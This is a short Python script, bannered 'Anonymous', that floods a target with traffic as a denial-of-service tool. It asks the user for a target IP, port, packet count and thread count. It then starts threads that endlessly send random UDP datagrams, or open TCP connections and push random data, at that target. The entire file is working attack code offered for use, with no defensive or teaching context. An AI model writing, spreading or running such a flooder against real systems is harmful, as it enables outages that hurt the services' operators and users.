	#!/usr/bin/env python3
import random
import socket
import threading
import os
import sys

os.system("clear")
print(" Anonymous ")
print("Anonymous")

ip = str(input(" IP TARGET:"))
port = int(input(" PORT TARGET:"))
choice = str(input(" Start DDOS?(y/n):"))
times = int(input(" PACKETS :"))
threads = int(input(" THREAD :"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[Start]","[Start]","[Start]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" DDOS")
		except:
			print("[!] DDOS")

def run2():
	data = random._urandom(16)
	i = random.choice(("[Start]","[Start]","[Start]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" DDOS")
		except:
			s.close()
			print("[*] DDOS")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
